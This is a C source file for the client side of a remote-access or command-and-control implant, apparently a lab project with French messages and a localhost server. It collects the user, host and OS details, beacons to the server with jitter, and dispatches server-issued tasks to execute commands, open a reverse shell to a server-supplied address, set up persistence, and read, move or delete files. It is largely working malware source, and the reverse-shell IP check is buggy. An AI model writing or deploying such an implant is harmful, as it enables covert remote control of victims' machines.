#define _POSIX_C_SOURCE 200112L  // For gethostname function declaration

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <netdb.h>

#include "base64.h"
#include "client.h"
#include "tasks.h"
#include "network.h"


// Global variables
char uid[64];
double sleep_time = 5;
double jitter = 0.0;


char* get_username() {
    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        return pw->pw_name;
    }
    return "inconnu";
}

char* get_hostname() {
    static char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        strcpy(hostname, "inconnu");
    }
    return hostname;
}

char* get_os() {
    struct utsname uts;
    if (uname(&uts) == 0) {
        static char os_info[256];
        snprintf(os_info, sizeof(os_info), "%s %s", uts.sysname, uts.release);
        return os_info;
    }
    return "inconnu";
}


// Server information
const char* server_ip = "127.0.0.1";
const int server_port = 8080;
const int buffer_size = 1024;

void get_uid() {
    char *username = get_username();
    char *hostname = get_hostname();
    char *os = get_os();

    char declaration[buffer_size];
    snprintf(declaration, buffer_size, "DECLARE,%s,%s,%s\n", username, hostname, os);
    
    char* response = send_server_message(declaration, server_ip, server_port);
    if (response == NULL) {
        strcpy(uid, "unknown");
        return;
    }
    
    // Format attendu: "Ok,ad8895843b"
    strtok(response, ",");  // ignore the first field
    char* id = strtok(NULL, ",");
    
    // Trim trailing whitespace and newlines
    if (id != NULL) {
        char* end = id + strlen(id) - 1;
        while (end > id && (*end == ' ' || *end == '\n' || *end == '\r')) {
            *end = '\0';
            end--;
        }
        strcpy(uid, id);
    } else {
        strcpy(uid, "unknown");
    }
    
    free(response);
    printf("UID Machine : '%s'\n", uid);
}

void calculate_random_sleep_time() {
    double time_1 = sleep_time - (jitter/100.0 * sleep_time);
    double time_2 = sleep_time + (jitter/100.0 * sleep_time);
    
    // Seeding random number generator
    srand(time(NULL));
    
    double random_factor = (double)rand() / RAND_MAX;
    sleep_time = time_1 + random_factor * (time_2 - time_1);
}

void check_commands() {
    char message[128];
    snprintf(message, sizeof(message), "FETCH,%s", uid);
    
    char* result = send_server_message(message, server_ip, server_port);
    if (result == NULL) {
        return;
    }

    
    // Check if the server returns an error
    if (strncmp(result, "ERROR", 5) == 0) {
        printf("Erreur reçue du serveur: %s\n", result);
        free(result);
        return;
    }
    
    // Format attendu: "type,id_task,command,argument"
    char* type = strtok(result, ",");
    
    if (type != NULL) {
        char* id_task = strtok(NULL, ",");
        if (strcmp(type, "EXECVE") == 0) {
            char* command = strtok(NULL, ",");
            char* argument = strtok(NULL, ",");  // Get the argument as well
            task_execve(command, argument, id_task);
        } else if (strcmp(type, "SLEEP") == 0) {
            char* sleep_time_str = strtok(NULL, ",");
            char* jitter_str = strtok(NULL, ",");
            task_sleep(sleep_time_str, jitter_str);
        } else if (strcmp(type, "LOCATE") == 0) {
            task_locate(id_task);
        } else if (strcmp(type, "REVSHELL") == 0) {
            char* server_port_str = decode(strtok(NULL, ","));
            int server_port = atoi(server_port_str);
            char* server_ip = strtok(NULL, ",");
            if (strcmp(server_ip, "null") == 1) {
                server_ip = decode(server_ip);
            } else {
                server_ip = "127.0.0.1";
            }
            task_revshell(server_port, server_ip);
        } else if (strcmp(type, "PERSIST") == 0) {
            task_persist();
        } else if (strcmp(type, "CAT") == 0) {
            task_cat();
        } else if (strcmp(type, "MV") == 0) {
            task_mv();
        } else if (strcmp(type, "RM") == 0) {
            task_rm();
        } else if (strcmp(type, "PS") == 0) {
            task_ps();
        }
    }
    
    free(result);
}